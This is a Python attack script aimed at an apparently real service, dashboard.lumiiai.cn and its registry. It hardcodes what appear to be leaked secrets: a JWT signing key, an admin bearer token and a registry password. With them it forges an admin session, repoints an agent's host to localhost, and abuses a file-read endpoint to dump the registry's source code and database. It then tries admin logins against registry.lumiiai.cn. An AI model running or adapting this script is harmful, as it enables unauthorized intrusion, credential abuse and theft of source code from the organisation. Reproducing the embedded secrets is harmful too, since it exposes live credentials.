#!/usr/bin/env python3
# i29399 round d: read lumii-registry SOURCE via dashboard files-RPC local read (no SSH); external registry probe+login.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
HOST="dashboard.lumiiai.cn"; JWT_SECRET="w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="; ADMIN_TOKEN="6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
START=time.time()
REG_PW="PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP"; REG_TOKEN="9d275d97606940a90c37f2b1ab8caaa21c43075f5019f6d21cef08c0d625f4ce"
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def run(args,timeout=60,maxlen=400000):
    try:
        p=subprocess.run(args,capture_output=True,timeout=timeout); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,session=None,admin=False,timeout=40,maxlen=400000):
    url="https://%s%s"%(HOST,path)
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if session: a+=["-H","Cookie: session="+session]
    if admin: a+=["-H","Authorization: Bearer "+ADMIN_TOKEN]
    if body is not None: a+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": a+=["-X",method]
    a+=[url]; rc,out,err=run(a,timeout=timeout+15); t=out.decode("utf-8","replace"); c="";i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"body":t[:maxlen]}
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def forge(uid,cust="aro"):
    now=int(time.time())
    hh=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    pp=b64u(json.dumps({"userId":uid,"email":"p@x","customer":cust,"role":"admin","iat":now,"exp":now+86400*7},separators=(",",":")))
    return hh+"."+pp+"."+b64u(hmac.new(JWT_SECRET.encode(),(hh+"."+pp).encode(),hashlib.sha256).digest())
def ext(url,method="GET",body=None,headers=None,timeout=14,maxlen=30000,auth=None):
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if auth: a+=["--user",auth]
    for h in (headers or []): a+=["-H",h]
    if body is not None: a+=["-X",method,"--data-binary",body]
    elif method!="GET": a+=["-X",method]
    a+=[url]; rc,out,err=run(a,timeout=timeout+12); t=out.decode("utf-8","replace"); c="";i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"body":t[:maxlen]}

# pick an aro agent, patch host->127.0.0.1, forge session
r=call("/api/admin/agents",admin=True,timeout=45)
try: agents=(json.loads(r["body"]) or {}).get("agents",[])
except: agents=[]
cand=[a for a in agents if a.get("customer")=="aro" and a.get("id")]
AID=(cand[0]["id"] if cand else "agent-15a45493")
orig={"ip":None,"sshUser":None}
for a in agents:
    if a.get("id")==AID: orig={"ip":a.get("ip"),"sshUser":a.get("sshUser")}
R("PICK",{"aid":AID,"orig":orig})
pr=call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":"127.0.0.1","ssh_user":"ubuntu"},timeout=25)
R("PATCH",pr)
# find agent owner userId: try from agents dto
uid="af0a2285-490f-11f1-ac43-525400595be1"
sess=forge(uid,"aro")
def rd(path):
    u="/api/agents/%s/files?action=read&path=%s"%(AID,up.quote(path,safe="/"))
    return call(u,session=sess,timeout=30)
FILES=["admin-auth.ts","instance-auth.ts","wechat-login.ts","app.ts","main.ts","db.ts","market-images.ts",
       "cloud-environments.ts","cloud-environment-config.ts","onboard-ops.ts","enterprise-ops.ts","market-ops.ts",
       "validate.ts","market-secret.ts","project-permissions.ts"]
srcdump={}
for f in FILES:
    rr=rd("/opt/lumii-registry/src/"+f)
    srcdump[f]={"code":rr["code"],"len":len(rr["body"]),"body":rr["body"][:40000]}
    R("SRC_"+f.replace(".","_"), rr["body"][:40000])
# also try DB read (likely root-600 -> fail) and package.json
for p in ["/opt/lumii-registry/package.json","/var/lib/lumii-registry/registry.db"]:
    rr=rd(p); R("RD_"+re.sub(r'\W','_',p), {"code":rr["code"],"len":len(rr["body"]),"head":rr["body"][:200]})
# restore
call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":orig.get("ip"),"ssh_user":orig.get("sshUser")},timeout=25)
R("RESTORED",{"aid":AID,"orig":orig})

# ---- parse routes from app.ts and try external login ----
app_txt=srcdump.get("app.ts",{}).get("body","")
routes=sorted(set(re.findall(r"""(?:app|router)\.(?:get|post|put|patch|delete|all|use)\(\s*['"]([^'"]+)['"]""",app_txt)))
routes2=sorted(set(re.findall(r"""['"](/api/[a-zA-Z0-9_\-/:]+)['"]""",app_txt)))
R("ROUTES",{"r1":routes[:80],"r2":routes2[:80]})
def try_login(base,path,body,hdrs=None):
    return ext(base+path,method="POST",body=json.dumps(body),headers=["Content-Type: application/json"]+(hdrs or []),timeout=12)
lp={}
for path in ["/api/admin/login","/admin/login","/api/login","/api/admin/session","/api/admin/auth","/admin/api/login"]:
    lp[path]=try_login("https://registry.lumiiai.cn",path,{"password":REG_PW})
    lp[path+"#basic"]=ext("https://registry.lumiiai.cn"+path,method="POST",body="{}",headers=["Content-Type: application/json"],auth="admin:"+REG_PW,timeout=12)
R("LOGIN",lp)
# root probe
R("REG_ROOT",ext("https://registry.lumiiai.cn/",timeout=12))
R("REG_HEALTH",ext("https://registry.lumiiai.cn/health",timeout=12))
R("P99_done",{"elapsed":int(time.time()-START)})
print("DONE",flush=True)
